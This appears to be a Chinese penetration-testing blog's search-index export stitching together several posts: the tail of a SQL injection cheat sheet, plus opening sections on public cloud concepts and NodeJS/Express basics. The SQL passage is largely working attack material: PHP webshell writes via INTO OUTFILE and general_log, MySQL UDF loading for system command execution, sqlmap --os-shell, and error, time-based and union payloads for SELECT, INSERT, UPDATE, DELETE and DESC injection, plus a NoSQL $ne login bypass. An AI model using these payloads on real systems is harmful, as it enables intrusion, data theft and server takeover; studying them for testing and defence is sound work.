SQL 注入，直接写入 webshell 文件到服务器，通过 GET 方法或者 POST 方法提交并执行外部指令，为后续进一步远程控制，提权，创造条件。 注意 需要 mysql 用户在写入文件夹下有写入权限，即 secure_file_priv 为不为空。 技巧 当secure_file_priv 不为空时，可以使用 general_log 写文件： set global general_log=on; set global general_log_file='C:/phpStudy/WWW/789.php'; select '\u003c?php eval($_POST['a']) ?\u003e'; 12.1.1 union select 后写入 selectusername,passwordfromuserswhereid=\"1\"unionselectnull,'\u003c?php @eval($_REQUEST[1]);?\u003e'intooutfile'/var/www/html/cmd.php' 注意：在 windows 下的分隔符为 /（斜杠）。 12.1.2 行分隔符写入 通过 select 语句查询的内容写入文件，也就是 into outfile ‘C:/wamp64/www/work/webshell.php’ 这样写的原因，然后利用 lines terminated by 语句拼接 webshell 的内容。 lines terminated by 可以理解为「以每行终止的位置添加 xx 内容」。 利用 lines starting by 语句拼接webshell的内容。lines starting by 可以理解为「以每行开始的位置添加 xx 内容」。 利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为「以每个字段的位置添加 xx 内容」。 //linesterminatedby写入?id=1limit1intooutfile'C:/wamp64/www/work/webshell.php'linesterminatedby'\u003c?php phpinfo() ?\u003e';//linesstartingby写入?id=1limit1intooutfile'C:/wamp64/www/work/webshell.php'linesstartingby'\u003c?php phpinfo() ?\u003e';//fieldsterminatedby写入?id=1intooutfile'C:/wamp64/www/work/webshell.php'fieldsterminatedby'\u003c?php phpinfo() ?\u003e';//COLUMNSterminatedby写入?id=1limit1intooutfile'C:/wamp64/www/work/webshell.php'COLUMNSterminatedby'\u003c?php phpinfo() ?\u003e'; ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:12:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"12.2 用户自定义函数 - UDF 还可以利用「用户自定义函数」的方式，即 User Defined Functions(UDF) 来执行命令。通过 lib_mysqludf_sys 提供的函数可以执行系统命令关键语句: sys_eval()，执行任意命令，并将输出返回 sys_exec()，执行任意命令，并将返回码返回 sys_get()，获取一个环节变量 sys_set()，创建或修改一个环境变量 12.2.1 UDF 库文件获取 https://github.com/mysqludf/lib_mysqludf_sys sqlmap/data/udf/mysql/ sqlmap 下的文件经过编码，需要使用 sqlmap/extra/cloak 目录下的 cloak.py 文件进行解码 # 解码文件 python cloak.py -d -i /path/to/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_linux.so 12.2.2 UDF 库文件写入 将 so 文件转成 16 进制，以 16 进制编码形式写入 selectunhex('???')intodumpfile'/usr/lib/mysql/plugin/lib_linux.so' 12.2.3 dumpfile vs. outfile 若我们想把一个可执行 2 进制文件用 into outfile 函数导出事实上导出后就会被破坏。 因为 into outfile 函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个 2 进制可执行文件就会被破坏。 这时候我们用 into dumpfile 就能导出一个完整能执行的 2 进制文件 into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理。 12.2.4 自定义函数 createfunctionsys_evalreturnsstringsoname\"lib_linux.so\";selectsys_eval('ifconfig'); ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:12:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"12.3 自动化工具 sqlmap -u \"url\" --os-shell sqlmap -u \"url\" --os-cmd=ifconfig ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:12:3","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"13 注入技巧 从 SQL 语法角度，从不同的注入点位置说明 SQL 注入的技巧 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"13.1 SELECT 注入 select 语句用于数据表记录的查询，常在界面展示的过程中使用 13.1.1 注入点在 select_expr 源代码如下所示： \u003c?php $conn = mysqli_connect(\"127.0.0.1\", \"root\", \"root\", \"test\"); $res = mysqli_query($conn, \"SELECT ${_GET['id']}, content FROM wp_news\"); $row = mysqli_fetch_array($res); echo \"$row['title']\"; echo \"$row['content']\"; ?\u003e 可以采取时间盲注的方式，但是根据 MySQL 的语法，有更优的解决方法，即利用 AS 别名的方法，直接将查询的结果显示到界面中。 payload：?id=(select pwd from wp_user as title) 13.1.2 注入点在 table_reference 上文的 SQL 查询语句改为：$res = mysqli_query($conn, \"SELECT title FROM ${_GET['table']}\"); 仍然可以利用别名的方式直接取出数据 select title from (select pwd AS title from wp_user)x 技巧 在不知表名的情况下，可以先从 information_schema.tables 中查询表名。 在 select_expr 和 table_reference 的注入，如果注入的点有反引号包裹，那么需要先闭合反引号。 13.1.3 注入点在 WHERE 或 HAVING 后 SQL 语句：$res = mysqli_query($conn, \"SELECT title FROM wp_news WHERE id=${_GET[id]}\") 实战中最常遇到的情况，要先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。注入点在 HAVING 后的情况与之相似。 13.1.4 注入点在 GROUP BY 或 ORDER BY 后 13.1.4.1 利用报错 select*fromwp_user_orderby1|updatexml(1,concat(0x7e,database(),0x7e),0) 1105 - XPATH syntax error: ‘~sectest~’, Time: 0.000000s 13.1.4.2 利用延时 $res=mysqli_query($conn,\"SELECT title FROM wp_news GROUP BY ${_GET['title']}\"); 经过测试可以发现，?title=id desc,(if(1，sleep(1),1)) 会让页面迟 1 秒，于是可以利用时间注入获取相关数据。 警告 该方法只能用在 mysql 5 上，mysql 8 上失效。 13.1.4.3 利用 \u0026 | ^ 位运算符进行 order by //布尔型盲注select*fromwp_user_orderbyid|(if(1,2,1))//id和if返回的结果进行按位与进行orderby根据时间判断select*fromwp_user_orderby1|if(database()regexp\"sectest\",sleep(1),0) 13.1.4.4 利用括号闭合进行联合查询 前提是前句查询必须带有括号。 (select * from person order by 1) union (select 1,2,3) Demo https://chall.tasteless.eu/level1/index.php?dir=asc payload: ?dir=,3)union(select%201,flag%20from%20level1_flag)%23 13.1.5 注入点在 LIMIT 后 LIMIT 后的注入判断比较简单，通过更改数字大小，页面会显示更多或者更少的记录数。由于语法限制，前面的字符注入方式不可行（LIMIT 后只能是数字），在整个 SQL 语句没有 ORDER BY 关键字的情况下，可以直接使用 UNION 注入。 另外，可根据 SELECT 语法，通过加入 PROCEDURE 来尝试注入，这类语句只适合 MySQL 5.6 前的版本， select id from wp_news limit 2 procedure analyse(extractvalue(1,concat(0x7e,version())),1) 也可以进行时间盲注 procedure analyse((select extractvalue(1,concat(0x3a,(if(mid(version(),1,1) LIKE 5, BENCHMARK(500000, SHA(1)), 1))))),1) 也可以直接写文件 into outfile ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"13.2 INSERT 注入 通常，注入位于字段名或者字段值的地方，且没有回显信息 13.2.1 注入点位于 tbl_name 如果能够通过注释符注释后续语句，则可直接插入特定数据到想要的表内，如管理员表。例如，对于如下 SQL 语句： $res = mysqli_query($conn, \"INSERT INTO {$_GET['table']} VALUES(2,2,2,2)\"); 开发者预想的是，控制 table 的值为 wp_news，从而插入新闻表数据。由于可以控制表名，可以访问 ?table=wp_user values(2，'newadmin'，'newpass')%23，直接插入管理员。 13.2.2 注入点位于 VALUES 13.2.2.1 INSERT 延时 INSERTintowp_user_(username,password,year)VALUES(\"test1\",\"122\",\"3\"andsleep(1))INSERTintowp_user_(username,password,year)VALUES(\"test1\",\"122\",\"3\"\u0026sleep(1))INSERTintowp_user_(username,password,year)VALUES(\"test1\",\"122\",\"3\"|sleep(1)) 13.2.2.2 INSERT 报错 INSERTintowp_user_(username,password,year)VALUES(\"test1\",\"122\"orupdatexml(1,concat(0x7e,DATABASE()),0),1)INSERTintowp_user_(username,password,year)VALUES(\"test1\",\"122\"andupdatexml(1,concat(0x7e,DATABASE()),0),1)INSERTintowp_user_(username,password,year)VALUES(\"test1\",\"122\"\u0026updatexml(1,concat(0x7e,DATABASE()),0),1)INSERTintowp_user_(username,password,year)VALUES(\"test1\",\"122\"|updatexml(1,concat(0x7e,DATABASE()),0),1)INSERTintowp_user_(username,password,year)VALUES(\"test1\",\"122\"+updatexml(1,concat(0x7e,DATABASE()),0),1) result: 1105 - XPATH syntax error: ‘~sectest’, Time: 0.000000s Demo http://chall.tasteless.eu/level15/ payload insertintotablesvalues('\\',',(select flag from level15_flag))# ') name: \\ text: ,(select flag from level15_flag))# ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"13.3 UPDATE 注入 13.3.1 UPDATE 报错 updatewp_user_setpassword=\"zxczxcxzc\"orupdatexml(1,concat(0x7e,database()),1)whereid=9updatewp_user_setpassword=\"zxczxcxzc\"or(updatexml(1,concat(0x7e,database()),1))whereid=9 13.3.2 UPDATE 延时 updatewp_user_setpassword=\"2\"andsleep(1)whereid=9updatewp_user_setpassword=\"00000000\"andif((LENGTH(database())=8),sleep(1),0)whereid=9//password处必须为数字型 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:3","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"13.4 DELETE 注入 13.4.1 DELETE 延时 deletefromwp_user_whereid=21or/and(sleep(2))deletefromwp_user_whereid=21andif((LENGTH(database()=7)),sleep(2),0) 13.4.2 DELETE 报错 deletefromwp_user_whereid=21andupdatexml(1,concat(0x7e,database()),1) ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:4","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"13.5 DESCIBE 注入 {DESCRIBE | DESC} table_name [col_name | wild] DESCRIBE 提供有关一个表的列信息。col_name 可以是一个列名或是一个包含 SQL 通配符字符 %和 _ 的字符串。 源代码： \u003c?php require(\"config.php\"); $table = $_GET['table']?$_GET['table']:\"test\"; $table = Filter($table); mysqli_query($mysqli,\"desc `secret_{$table}`\") or Hacker(); $sql = \"select 'flag{xxx}' from secret_{$table}\"; $ret = sql_query($sql); echo $ret[0]; ?\u003e desc 可以接受两个参数，可以过掉第一个检测。 反引号在 union select 中可以当做空格。 payload: ?table=test`` union select database() limit 1 offset 1 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:5","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"14 NoSQL 注入 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:14:0","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"14.1 定义 泛指非关系型的数据库。随着互联网 web2.0 网站的兴起，在高可用，高并发压力下，传统数据库已经不能满足需求，用于解决大数据应用和超大规模数据存储的问题。 主要代表：MongDB、 Redis、 Memcache 以 MongDB 为例，它是一个面向文档存储的数据库，以键值对形式存在 { name: \"Geekby\", age: 26, status: \"A\", groups: [\"news\", \"sports\"] } ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:14:1","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"14.2 注入原理一 基本语法 注入过程 以用户身份验证为例，POST 请求： username=test\u0026password=123456 后端程序语言，我们希望是这样的： db.users.find({username: 'test', password: '123456'}) 因此，我们可以构造如下请求： username[$ne]=1\u0026password[$ne]=1 实际后端程序运行： db.logins.find({username:{$ne:1}, password:{$ne:1}}) 类比传统 SQL 语句： select * from logins where username \u003c\u003e 1 and password \u003c\u003e 1 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:14:2","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["常用","渗透测试"],"content":"14.3 注入原理二 如果在编程语言中不够谨慎，也可能产生像 sqli 注入那样的截断问题，但是这是在程序语言中而非 SQL 语句中： $script= \"try{ var key = db.users.find({username: 'test'}).value; var inputValue = '\".$input.\"'; if(key == inputValue) { return('match'); }}\"; 当输入 ';return key;// -\u003e var inputValue='';return key;//'，导致 inputValue 为空，直接返回 key 字段 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:14:3","tags":["常用","渗透测试"],"title":"SQL注入相关","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["渗透测试"],"content":"公有云介绍及相关漏洞利用方式","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"公有云安全 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:0:0","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"1 前言 Tips 云租户安全不在讨论范围内 云原生应用漏洞略有涉及 微服务不在讨论范围内 云安全配置错误以及不正确的「案例」示范是导致安全问题频发的重要原因 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:1:0","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"1.1 为什么要上云 安全传统边界模糊 all in cloud 公司越来越多 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:1:1","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"1.2 相关资料 https://aws.amazon.com/n/training/ https://edu.aliyun.com https://cloud.tencent.com/edu/training https://cloud.google.com/certification/ https://www.microsoft.com/zh-cn/learning/azure-training.aspx ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:1:2","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"1.3 常见的云产品 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:1:3","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2 常见概念 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:0","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2.1 元数据 - metadata 在云计算中，Metadata 并不是一个陌生的概念。从字面上看，Metadata 是元数据的意思。而在云计算中，Metadata 服务能够向虚机注入一些额外的信息，这样虚机在创建之后可以有一些定制化的配置。在 OpenStack 中，Metadata 服务能够向虚机提供主机名，ssh 公钥，用户传入的一些定制数据等其他信息。这些数据被分为两类：metadata 和 user data，metadata 主要包括虚机自身的一些数据比如 hostname、ssh 秘钥、网络配置等，而 user data 主要包括一些定制的脚本、命令等。但是不管是哪一种数据，openstack 向虚机提供数据的方式是一致的。 Tips 可以类比 docker file ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:1","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2.2 可用区 - Available Zone 和区域 - Region 先来看一下区域（Region）概念。AWS 云服务在全球不同的地方都有数据中心，比如北美、南美、欧洲和亚洲等。与此对应，根据地理位置我们把某个地区的基础设施服务集合称为一个区域。通过 AWS 的区域，一方面可以使得 AWS 云服务在地理位置上更加靠近我们的用户，另一方面使得用户可以选择不同的区域存储他们的数据以满足法规遵循方面的要求 以阿里云为例： ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:2","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2.3 IAM - Identify and Access Management 可帮助你安全地控制用户对 AWS 资源的访问权限。通过 IAM 可以控制哪些人可以使用你的 AWS 资源(身份验证)以及他们可以使用的资源和采用的方式(授权)。 IAM-AWS RAM-阿里云 CAM-腾讯云 IAM-华为云 2.3.1 用户 如果您购买了多台云服务器 ECS 实例，您的组织里有多个用户（如员工、系统或应用程序）需要使用这些实例，您可以创建一个策略允许部分用户使用这些实例。避免了将同一个 AccessKey 泄露给多人的风险。 2.3.2 用户组 您可以创建多个用户组，并授予不同权限策略，起到批量管理的效果。例如： 为了加强网络安全控制，您可以给某个用户组授权一个权限策略，该策略可以规定：如果用户的 IP 地址不是来自企业网络，则拒绝此类用户请求访问相关 ECS 资源。 您可以创建以下两个用户组管理不同工作职责的人员，如果某开发人员的工作职责发生转变，成为一名系统管理人员，您可以将其从 Developers 用户组移到 SysAdmins 用户组。 SysAdmins：该用户组需要创建和管理的权限。您可以给 SysAdmins 组授予一个权限策略，该策略授予用户组成员执行所有 ECS 操作的权限，包括 ECS 实例、镜像、快照和安全组等。 Developers：该用户组需要使用实例的权限。您可以给 Developers 组授予一个权限策略，该策略授予用户组成员调用 DescribeInstances、StartInstance、StopInstance、RunInstance 和 DeleteInstance 等权限。 2.3.3 角色 实例 RAM 角色允许您将一个角色关联到 ECS 实例，在实例内部基于STS（Security Token Service）临时凭证访问其他云产品的 API，临时凭证将周期性更新。即可以保证云账号 AccessKey 安全，还可以借助访问控制 RAM 实现精细化控制和权限管理。 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:3","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2.4 VPC - Virtual Private Cloud 专有网络 VPC 允许用户在云上构建出一个逻辑隔离分区，让用户在自己定义的虚拟网络中创建并运行新网的资源。用户可以完全掌控您的虚拟网络环境，包括选择 IP 地址范围，创建子网和配置路由表等。 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:4","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2.5 ARN - Aliyun Resource Name 资源 ARN 的格式为: arn:acs:${Service}:${Region}:${Account}:${ResourceType}/${ResourceId} 各字段含义如下： Service：云产品code。 Region：地域ID。 Account：阿里云账号ID。 ResourceType：资源类型。 ResourceId：资源ID。 arn:acs:ecs:cn-hangzhou:123456789\\*\\*\\*\\*:instance/i-xxxxxxxxxxxxxx 参考： https://help.aliyun.com/document_detail/172061.html?spm=5176.10695662.1996646101.searchclickresult.b8ae1b9ejjB6pU ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:5","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2.6 Access Key \u0026 Access Secret Key 访问密钥 AccessKey（AK）相当于登录密码，只是使用场景不同。AccessKey 用于程序方式调用云服务 API，而登录密码用于登录控制台。 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:6","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2.7 架构图 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:7","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"3 公有云信息收集 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:3:0","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"3.1 识别和发现云产品 产品的关键字 识别产品区域 主动 FUZZ / 被动发现相辅相成 甲方视角发现 原生漏洞还是存在，比如 Hadoop 漏洞还是存在，RDS 弱口令还是有 3.1.1 关键词整理 ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:3:1","tags":["渗透测试","公有云"],"title":"公有云安全","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"NodeJS 安全","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"NodeJS 安全 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:0:0","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"1 NodeJS 基础 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:1:0","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"1.1 定义与原理 是一个开源的、跨平台的运行时环境，有了它，开发人员可以使用 JavaScript 创建各种服务器端工具和应用程序。此运行时要用于浏览器上下文之外(即可以直接运行于计算机或服务器操作系统上)。 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:1:1","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"1.2 常见框架 Express 是最流行的 Node 框架，是许多其它流行 Node 框架的底层库。虽然 Express 本身是极简风格的，但是开发人员通过创建各类兼容的中间件包解决了几乎所有的 web 开发问题。这些库可以实现 cookie、会话、用户登录、URL 参数、POST 数据、安全头等功能。 特点： 为不同 URL 路径中使用不同 HTTP 动词的请求(路由)编写处理程序。 集成了「视图」渲染引擎，以便通过将数据插入模板来生成响应。 设置常见 Web 应用设置，比如用于连接的端口，以及渲染响应模板的位置。 在请求处理管道的任何位置添加额外的请求处理「中间件」。 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:1:2","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"1.3 Node 环境 1.3.1 基础环境 下载地址：https://nodejs.org/en/ 从 HelloWorld 程序开始 const http = require('http'); http.createServer((req, res)=\u003e{ res.writeHead(200, {'Content-Type': 'text/plain'}); res.end(\"Hello World\\n\"); }).listen(80); 1.3.2 Express 环境简介 安装 npm install express 从 HelloWorld 程序开始 const express = require('express'); const app = express(); app.get('/hello', (req, res) =\u003e { res.send(\"Hello World\"); }); app.listen(80, () =\u003e { console.log(\"listen on 80\"); }); ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:1:3","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2 Express 及其组件 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:2:0","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2.1 路由模块 路由的作用就是解析 URL，调用对应的控制器（的方法，并传递参数）。 客户端的请求是以 URL 的形式传递给服务器的。传统 WEB 开发中，URL 对应服务器上某个目录下的某个文件。MVC 开发则改变了这种对应关系，WEB 服务器会截获所有请求，不做资源存在性检查，直接转发给网站的路由程序。 路由器再调用相关的控制器。控制器调用相关的服务，并返回视图对象。路由器再从视图对象中提取生成好的网页代码返回给 Web 服务器，最终返回给客户端。 举例： download.js const express = require('express'); const router = express.Router(); router.get('/', (req, res) =\u003e { res.send('download page'); }); router.get('/docs', (req, res) =\u003e { res.send('download page docs'); }); module.exports = router; main.js const express = require('express'); const app = express(); const download = require(__dirname + \"/download.js\"); app.use('/download', download); app.get('/', (req, res) =\u003e { res.send(\"Hello World\"); }); app.get('/news', (req, res) =\u003e { res.send(\"news page\"); }); app.listen(80, () =\u003e { console.log('listen on 80'); }); app.use 表示对所有路由，和所有方法都调用中间函数 app.get ('/')表示对 get 方法开头的 URL 调用中间函数 app.use('/download') 表示对 /download 头的所有，调用中间函数。 ","date":"2020-12-27","objectID":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/:2:1","tags":["渗透测试","NodeJS"],"title":"NodeJS 安全","uri":"/2020/12/nodejs-%E5%AE%89%E5%85%A8/"},{"categories":["渗透测试"],"content":"2.1 中间件 中间件在 Express 